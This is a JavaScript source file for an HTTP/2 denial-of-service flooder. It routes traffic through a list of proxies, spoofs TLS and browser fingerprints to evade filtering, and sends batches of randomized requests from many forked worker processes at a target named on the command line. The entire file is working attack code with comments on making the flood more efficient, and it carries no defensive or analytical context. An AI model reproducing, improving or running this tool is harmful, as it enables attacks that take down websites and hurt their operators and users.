const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");

const language_header = [
  'en-US,en;q=0.9,ru;q=0.8,kk;q=0.7',
  'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,kk;q=0.6',
  'kk-KZ,kk;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6'
];

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];
const encoding_header = ["gzip, deflate, br"];


const cplist = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
  "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256"];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE ;
if (process.argv.length < 7) {
  console.log(`Usage: host time req thread proxy.txt`);
  process.exit();
}

const secureProtocol = ["TLSv1_2_method", "TLSv1_3_method"];
const headers = {};

const secureContextOptions = {
  ciphers: ciphers,
  sigalgs: SignalsList,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
//var UAs = fs.readFileSync('user-agents.txt', 'utf-8').replace(/\r/g, '').split('\n');
const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
  console.clear()
  console.log(`attack sent`.brightBlue)
  console.log(`--------------------------------------------`.gray)
  
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
    setTimeout(() => {
      for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
      }
    }, RESTART_DELAY);
  };

  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
      restartScript();
    }
  };
  
  setInterval(handleRAMUsage, 5000);
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder)
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);
    const connection = net.connect({
      host: options.host,
      port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    
    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });
  }
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Socker = new NetSocket();

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function generateRandomString(min, max) {
    const length = Math.floor(Math.random() * (max - min + 1)) + min;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let out = "";
    for (let i = 0; i < length; i++) out += chars[Math.floor(Math.random() * chars.length)];
    return out;
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

function runFlooder() {
  // MEMORY OPTIMIZATIONS
  
  // Cache these calculations outside the loop
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  const targetHost = parsedTarget.host;
  const targetPath = parsedTarget.path;
  const targetHref = parsedTarget.href;
  
  // Avoid object creation in tight loops
  const baseHeaders = {
    ":authority": targetHost,
    ":scheme": "https",
    ":method": "GET",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
  };

  // PERFORMANCE OPTIMIZATIONS
  
  // Use connection pooling
  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1], // Using bitwise NOT NOT is good
    address: `${targetHost}:443`,
    timeout: 10
  };
  
  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return; // Good early return

    // TCP optimizations
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const tlsConn = tls.connect(parsedPort, targetHost, {
      // Keep only necessary options to reduce overhead
      ALPNProtocols: ["h2", "http/1.1"],
      ciphers: cipper,
      sigalgs: sigalgs,
      socket: connection,
      ecdhCurve: ecdhCurve,
      honorCipherOrder: false,
      rejectUnauthorized: false,
      secureOptions: secureOptions,
      secureContext: secureContext,
      host: targetHost,
      servername: targetHost,
      secureProtocol: secureProtocol
    });
    
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    
    // CLIENT OPTIMIZATIONS
    
    const client = http2.connect(targetHref, {
      createConnection: () => tlsConn,
      settings: {
        headerTableSize: 65536,
        maxHeaderListSize: 32768, 
        initialWindowSize: 15564991,
        maxFrameSize: 16384,
      },
    });
    
    // TIMING OPTIMIZATIONS
    
    // Use requestAnimationFrame or process.nextTick for better timing
    client.on("connect", () => {
      // Pre-generate some random values for headers
      const randomHeaders = [];
      for (let i = 0; i < 10; i++) {
        randomHeaders.push(generateRandomString(10, 25));
      }
      
      let headerIndex = 0;
      const IntervalAttack = setInterval(() => {
        const batchRequests = [];
        
        for (let i = 0; i < args.Rate; i++) {
          // Reuse headers and only change what's necessary
          const randomQuery = randomHeaders[headerIndex % 10];
          headerIndex++;
          
          const headers = {...baseHeaders};
          headers[":path"] = `${targetPath}?query=${randomQuery}`;
          headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
          headers["sec-fetch-mode"] = fetch_mode[Math.floor(Math.random() * fetch_mode.length)];
          headers["sec-fetch-site"] = fetch_site[Math.floor(Math.random() * fetch_site.length)];
          headers["sec-fetch-dest"] = fetch_dest[Math.floor(Math.random() * fetch_dest.length)];
          headers["accept-Language"] = language_header[Math.floor(Math.random() * language_header.length)];
          
          const request = client.request(headers, {
            weight: 220,
          });
          
          // Cleanup immediately after response without anonymous function
          request.on('response', () => {
            request.close();
            request.destroy();
          });
          
          request.end();
          batchRequests.push(request);
        }
        
        // Optional: Memory cleanup after batch
        if (batchRequests.length > 5000) {
          global.gc && global.gc(); // Force garbage collection if available
        }
      }, 300);
      
      // Add timeout to clear interval
      setTimeout(() => clearInterval(IntervalAttack), 3600000); // 1-hour max runtime
    });
    
    // ERROR HANDLING OPTIMIZATIONS
    
    // Use a single cleanup function
    const cleanup = () => {
      client.destroy();
      tlsConn.destroy();
      connection.destroy();
    };
    
    client.on("close", cleanup);
    client.on("timeout", cleanup);
    client.on("error", cleanup);
  });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});